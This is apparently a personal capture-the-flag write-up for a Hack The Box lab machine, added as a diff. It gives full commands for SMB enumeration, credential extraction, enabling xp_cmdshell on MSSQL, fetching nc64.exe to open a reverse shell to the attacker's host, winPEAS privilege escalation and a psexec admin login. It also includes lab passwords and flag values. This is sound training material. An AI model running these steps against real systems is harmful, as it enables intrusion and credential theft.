@@ -1,0 +1,52 @@
+sudo nmap -sC -sV 10.129.240.43 # port scan on the ip
+->database server port = 1433
+
+smbclient -N -L 10.129.238.100 # list share over SMB
+->non-administrative one = backups
+
+smbclient -N \\\\10.129.238.100\\backups #going in the only non-admin share
+ls #in the smb share we find prod.dtsConfig
+get prod.dtsConfig #getting the file in our machine
+exit
+cat prod.dtsConfig
+-> we find the password M3g4c0rp123 for user id ARCHETYPE\sql_svc
+
+now we need mssqlclient.py in order to establish an authenticated connection to a microsoft SQL server
+step to install mssql : 
+git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+pip3 install -r requirements.txt
+sudo python3 setup.py install
+
+python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.240.43 -windows-auth # this allows us to connect to a microsoft sql server and get the shell of archetype
+if you use the 'help' command in the new shell we can see multiple command that we can use
+the 'xp_cmdshell' command allows us to use a windows command shell but it is often (like in our case) disable for security reason
+
+In order to be able to run the xp_cmdshell command i did : 
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure;
+EXEC sp_configure 'xp_cmdshell', 1; #this reconfigured xp_cmdshell to allow role 1 to use it (i discovered my role in the server by using 'SELECT is_srvrolemember('sysadmin');') 
+RECONFIGURE # to push the changes
+Now we are able to use the xp_cmdshell command
+
+Now we want a reverse shell
+sudo python3 -m http.server 80 # creating a http server in a new tab
+sudo nc -lvnp 443 # netcat listen on 443 in an other tab
+Now we need to upload nc64.exe binary to the target so first let's download it in our machine : wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.191/nc64.exe -outfile nc64.exe" # we go to a place where we are allow to write and get the nc64.exe binary from our HTTP server freshly created when doing that we can see a requet in our HTTP server tab
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.191 443" # we execute nc64.exe thanks to cmd.exe on 443 (where netcat is listenning) so that we get a reverse shell in our netcat listener
+Now we can go in our netcat tab and get the reverse shell, we can find the user flag in the file : C:\Users\sql_svc\Desktop\user.txt
+""3e7b102e78218e935bf3f4951fec21a3""
+
+Now that we have a sheel we want more privileges, so we're going to use winpeas for privilege escalation, we can download it here : https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
+powershell
+wget http://10.10.14.191/winPEASx64.exe -outfile winPEASx64.exe # getting win peas in the target
+.\winPEASx64.exe # let's execute winPEAS
+we got a long list of details about the target, we can find a vulnerable file : C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+inside we can see the administrator password : MEGACORP_4dm1n!!
+
+So now let's connect as administrator, so let's go back to our impacket tab and use : python3 psexec.py administrator@10.129.116.235 and then enter the administrator password
+Here we immediatly got a reverse shell because we already had the admin password
+the flag is in the file root.txt on the administrator Desktop
+""b91ccec3305e98240082d4474b848528""
